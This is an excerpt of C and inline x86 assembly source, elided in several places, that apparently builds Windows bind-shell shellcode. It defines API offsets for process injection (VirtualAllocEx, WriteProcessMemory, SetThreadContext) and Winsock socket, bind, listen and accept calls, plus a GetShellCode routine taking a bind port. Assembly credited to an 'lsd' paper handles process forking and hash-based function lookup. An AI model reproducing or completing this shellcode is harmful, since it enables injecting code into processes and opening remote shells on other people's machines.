...
#define _GetThreadContext       0x0C
#define _VirtualAllocEx         0x10
#define _WriteProcessMemory     0x14
#define _SetThreadContext       0x18
#define _ResumeThread           0x1C
// ws2_32.dll functions index
#define _WSAStartup             0x20
#define _WSASocketA             0x24
#define _setsockopt             0x28
#define _bind                   0x2C
#define _listen                 0x30
#define _accept                 0x34
// data index
...
unsigned char functions[100][128] =
{
    ...
    {"GetThreadContext"},   // [esi+0x0C]
    {"VirtualAllocEx"},     // [esi+0x10]
    {"WriteProcessMemory"}, // [esi+0x14]
    {"SetThreadContext"},   // [esi+0x18]
    {"ResumeThread"},       // [esi+0x1C]
    // ws2_32
    {"WSAStartup"},         // [esi+0x20]
    {"WSASocketA"},         // [esi+0x24]
    {"setsockopt"},         // [esi+0x28]
...
// get shellcode
void GetShellCode(unsigned short BindPort)
{
...
; from lsd's winasm paper and code
proc_fork:
        mov     ebp, esp                        ; return address
        ...
        push    4                               ; The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.
        ...
        call    dword ptr [esi+_VirtualAllocEx] ; v=VirtualAllocEx(pi.hProcess,NULL,0x5000,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
        ...
        push    eax
        push    dword ptr [edi]                 ; process handle
        call    dword ptr [esi+_WriteProcessMemory]             ; WriteProcessMemory(pi.hProcess,v,buf,sizeof(buf),NULL);
        
        push    esp
        push    dword ptr [edi+0x04]            ; thread handle
        call    dword ptr [esi+_SetThreadContext]             ; SetThreadContext(pi.hThread,&ctx)
...
find_hashfunc_addr:
        ...
        locate_fork_func:
        call    fork_func                       ; fork process locate functions address
        locate_addr:
        call    func_start
